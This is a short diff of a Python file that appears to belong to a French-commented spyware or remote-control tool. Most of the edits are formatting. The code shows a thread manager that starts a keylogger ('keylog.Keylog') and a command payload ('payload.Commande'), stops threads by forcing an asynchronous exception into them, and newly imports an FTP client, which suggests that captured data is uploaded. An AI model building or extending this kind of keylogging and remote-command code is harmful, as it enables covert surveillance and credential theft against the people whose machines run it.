@@ -12,16 +12,19 @@ import threading
 import inspect
 import sys
 import time
+from ftplib import FTP
 
-#pour la compil
+# pour la compil
 import imp
+
 
 def _async_raise(tid, exctype):
     """raises the exception, performs cleanup if needed"""
     tid = ctypes.c_long(tid)
     if not inspect.isclass(exctype):
         exctype = type(exctype)
-    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
+    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
+        tid, ctypes.py_object(exctype))
     if res == 0:
         raise ValueError("invalid thread id")
     elif res != 1:
@@ -30,23 +33,27 @@ def _async_raise(tid, exctype):
         ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
         raise SystemError("PyThreadState_SetAsyncExc failed")
 
+
 class Threads:
-    
+
     thread_id = 0
     thread_name = "null"
 
-    def StartThread(self, fonction, arg1 = ""):
+    def StartThread(self, fonction, arg1=""):
         if "Keylogger" in fonction:
             thread = threading.Thread(target=keylog.Keylog, name=fonction)
             thread.start()
         if "Commande" in fonction:
-            thread = threading.Thread(target=payload.Commande, name=fonction, args=arg1)
+            thread = threading.Thread(
+                target=payload.Commande, name=fonction, args=arg1)
             thread.start()
         self.thread_id = thread.ident
         self.thread_name = thread.name
-    
+
     def StopThread(self):
-        print("Arret du Thread : " + self.thread_name + ", numéro : " + str(self.thread_id))
+        print("Arret du Thread : " + self.thread_name +
+              ", numéro : " + str(self.thread_id))
         _async_raise(self.thread_id, SystemExit)
+
 
 class Payload:
